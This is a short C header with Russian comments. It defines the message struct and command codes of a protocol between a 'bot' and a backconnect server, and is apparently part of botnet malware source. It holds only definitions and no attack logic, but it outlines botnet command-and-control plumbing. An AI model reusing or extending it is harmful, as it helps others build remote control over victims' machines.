#ifndef NET_H_INCLUDED
#define NET_H_INCLUDED

#include <pshpack1.h>
__declspec(align(1)) struct BC_COMMAND
{
    WORD wStructSize;
    WORD wDataSize;
    byte bCommand;
};
#include <poppack.h>

enum
{
    COMMAND_UNKNOWN,    //Ошибка.
    COMMAND_BOTID,      //Послыется ботом. Информация, после структуры находится строка размером
                        //wDataSize, несущая ID бота. Также сообшает, что данное соединение является
                        //управляющим.
    COMMAND_CONNECT,    //Послыается сервером. Создание нового соединения с bc сервером. Несет в
                        //себе DWORD как уникальный ID для соединения.
    COMMAND_IS_SERVICE, //Послыется ботом. Сообшает о том, что данное соединение является сервисным,
                        //несет в себе DWORD полученый от COMMAND_CONNECT.
};

#define SOCKET_TIMEOUT 30*1000

#endif // NET_H_INCLUDED
